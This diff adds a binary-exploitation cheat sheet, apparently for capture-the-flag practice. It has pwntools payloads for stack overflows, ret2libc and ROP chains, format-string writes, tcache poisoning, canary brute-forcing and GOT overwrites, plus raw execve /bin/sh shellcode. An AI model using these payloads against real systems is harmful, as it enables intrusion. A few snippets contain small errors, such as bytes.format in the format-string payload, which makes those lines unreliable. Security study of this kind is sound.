@@ -1,0 +1,381 @@
+# Binary Exploitation (Pwn) Techniques
+
+## Initial Analysis
+
+### File Information
+```bash
+file binary
+checksec binary
+strings binary | less
+ltrace ./binary
+strace ./binary
+```
+
+### Checksec Output
+- RELRO: Full = GOT not writable, Partial = GOT writable after relocation
+- Stack: Canary = stack protector, No canary = vulnerable to stack overflow
+- NX: Enabled = stack not executable, Disabled = can execute shellcode on stack
+- PIE: Enabled = randomized addresses, Disabled = fixed addresses
+
+## Buffer Overflow
+
+### Find Offset
+```python
+from pwn import *
+# Generate pattern
+pattern = cyclic(200)
+# Send pattern and get crash offset
+offset = cyclic_find(0x61616161)  # EIP/RIP value from crash
+```
+
+### Basic Stack Overflow
+```python
+from pwn import *
+
+payload = b"A" * offset
+payload += p32(return_address)  # or p64 for 64-bit
+payload += p32(argument)        # if calling function with args
+
+p.sendline(payload)
+```
+
+### Return-to-libc
+When NX is enabled, can't execute shellcode on stack:
+```python
+# Find system() and "/bin/sh"
+system_addr = elf.plt['system']  # or from libc
+binsh_addr = next(elf.search(b'/bin/sh'))
+
+payload = b"A" * offset
+payload += p32(system_addr)
+payload += p32(0xdeadbeef)  # return address (doesn't matter)
+payload += p32(binsh_addr)  # argument to system()
+```
+
+## Return-Oriented Programming (ROP)
+
+### Finding Gadgets
+```bash
+ropper --file binary --search "pop rdi"
+ROPgadget --binary binary --ropchain
+```
+
+### 64-bit ROP Chain
+Arguments in registers: RDI, RSI, RDX, RCX, R8, R9
+```python
+pop_rdi = 0x401234  # address of "pop rdi; ret"
+pop_rsi = 0x401235  # address of "pop rsi; ret"
+
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+```
+
+### 32-bit ROP Chain
+Arguments on stack
+```python
+payload = b"A" * offset
+payload += p32(system_addr)
+payload += p32(exit_addr)
+payload += p32(binsh_addr)
+```
+
+### ret2libc Without PIE
+```python
+# Leak libc address
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+pop_rdi = 0x401234
+main_addr = elf.symbols['main']
+
+# Stage 1: Leak libc
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)  # return to main
+
+# Get leak and calculate libc base
+leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leak - libc.symbols['puts']
+
+# Stage 2: Get shell
+system = libc.symbols['system']
+binsh = next(libc.search(b'/bin/sh'))
+
+payload2 = b"A" * offset
+payload2 += p64(pop_rdi)
+payload2 += p64(binsh)
+payload2 += p64(system)
+```
+
+## Format String Vulnerabilities
+
+### Information Leak
+```python
+# Leak stack values
+p.sendline(b"%p " * 20)
+
+# Leak specific address
+p.sendline(b"%7$p")  # 7th value on stack
+
+# Leak string
+p.sendline(b"%s")
+```
+
+### Write-what-where
+```python
+# Write to address
+target_addr = 0x804a000
+value = 0x41414141
+
+payload = p32(target_addr)
+payload += b"%{}c%{}$n".format(value - 4, offset)
+```
+
+### Exploit Pattern
+1. Find offset to your input on stack
+2. Use %n to write to arbitrary address
+3. Overwrite GOT entry or return address
+
+## Heap Exploitation
+
+### Use-After-Free
+```python
+# Allocate chunk
+chunk1 = malloc(0x20)
+
+# Free it
+free(chunk1)
+
+# Allocate again with controlled data
+chunk2 = malloc(0x20)  # Gets same chunk
+write(chunk2, evil_data)
+
+# Use old pointer
+use(chunk1)  # Now points to our data
+```
+
+### Double Free
+```python
+free(chunk)
+free(another_chunk)
+free(chunk)  # Double free!
+```
+
+### Heap Overflow
+Overflow into next chunk's metadata
+
+### Tcache Poisoning (glibc 2.26+)
+```python
+# Free chunks into tcache
+free(chunk1)
+free(chunk2)
+
+# Overflow to modify chunk2's fd pointer
+overflow(chunk1, target_address)
+
+# Allocations return attacker-controlled address
+malloc()  # Returns chunk2
+malloc()  # Returns target_address
+```
+
+## Shellcode
+
+### x64 Linux Shellcode (execve /bin/sh)
+```python
+shellcode = asm(shellcraft.sh())
+# or manual:
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+shellcode += b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+```
+
+### x86 Linux Shellcode
+```python
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+shellcode += b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
+
+### Shellcode Injection
+```python
+# NX disabled
+payload = shellcode
+payload += b"A" * (offset - len(shellcode))
+payload += p32(buffer_address)  # Jump to shellcode
+```
+
+## Integer Overflow
+
+### Signed Integer Overflow
+```c
+int size = user_input;  // Can be negative!
+if (size < MAX_SIZE) {
+    char buf[256];
+    memcpy(buf, data, size);  // Copies huge amount if size is negative
+}
+```
+
+### Unsigned Integer Wraparound
+```c
+size_t len = strlen(input);
+char* buf = malloc(len + 1);  // Wraps to 0 if len = 0xffffffff
+strcpy(buf, input);  // Overflow!
+```
+
+## ASLR Bypass
+
+### Information Leak
+Leak stack/heap/libc addresses through:
+- Format string
+- Buffer over-read
+- Use-after-free
+
+### Partial Overwrite
+Lower bytes not randomized in PIE
+```python
+# Overwrite only lower 2 bytes
+payload = b"A" * offset
+payload += b"\x34\x12"  # Overwrite RIP lower bytes
+```
+
+### Brute Force
+ASLR on 32-bit = 2^8 to 2^16 possibilities
+
+## Canary Bypass
+
+### Information Leak
+Leak canary value through format string or buffer over-read
+
+### Brute Force
+On fork() servers, canary stays same
+```python
+for byte in range(256):
+    payload = b"A" * offset + bytes([byte])
+    if not crashed(payload):
+        canary += bytes([byte])
+```
+
+### Overwrite After Canary
+If you control data after canary check
+
+## GOT Overwrite
+
+### When Partial RELRO
+```python
+# Overwrite GOT entry
+target = elf.got['puts']
+system_addr = libc.symbols['system']
+
+# Use format string or overflow
+write(target, system_addr)
+
+# Now puts() calls system()
+puts("/bin/sh")  # Actually calls system("/bin/sh")
+```
+
+## One-Gadget
+
+### Find One-Gadgets in libc
+```bash
+one_gadget libc.so.6
+```
+
+Returns addresses where execve('/bin/sh') is called with constraints
+
+### Use One-Gadget
+```python
+one_gadget = libc.address + 0x4527a
+payload = b"A" * offset + p64(one_gadget)
+```
+
+## Pwntools Tips
+
+### Template
+```python
+from pwn import *
+
+# Setup
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+context.binary = elf
+
+# Start process
+if args.REMOTE:
+    p = remote('host', port)
+else:
+    p = process(elf.path)
+
+# Debug
+if args.GDB:
+    gdb.attach(p, '''
+        break main
+        continue
+    ''')
+
+# Exploit
+# ...
+
+p.interactive()
+```
+
+### Useful Functions
+```python
+p32(0x41414141)           # Pack 32-bit
+p64(0x4141414141414141)   # Pack 64-bit
+u32(data)                 # Unpack 32-bit
+u64(data)                 # Unpack 64-bit
+cyclic(200)               # Generate De Bruijn pattern
+cyclic_find(0x61616161)   # Find offset
+asm(shellcraft.sh())      # Generate shellcode
+```
+
+## Common Pitfalls
+
+### Stack Alignment
+x64 requires RSP to be 16-byte aligned before call
+```python
+# Add extra "ret" gadget before call
+payload += p64(ret_gadget)
+payload += p64(system)
+```
+
+### Null Bytes
+Null bytes terminate strings
+- Use little-endian (null bytes at end)
+- Use different functions (read() vs gets())
+
+### Buffer Size
+Make sure payload fits in buffer
+
+## Tools
+
+```bash
+# Disassemblers
+objdump -d binary
+gdb binary
+radare2 binary
+ghidra
+Binary Ninja
+
+# Dynamic analysis
+ltrace ./binary
+strace ./binary
+gdb ./binary
+
+# Exploitation
+pwntools (Python)
+ropper / ROPgadget
+one_gadget
+pwndbg / gef (GDB plugins)
+```
+
+## Quick Checklist
+
+1. checksec - What protections are enabled?
+2. Find vulnerability (overflow, format string, etc.)
+3. Calculate offset
+4. Leak addresses if ASLR/PIE
+5. Build ROP chain or shellcode
+6. Test locally
+7. Adapt for remote
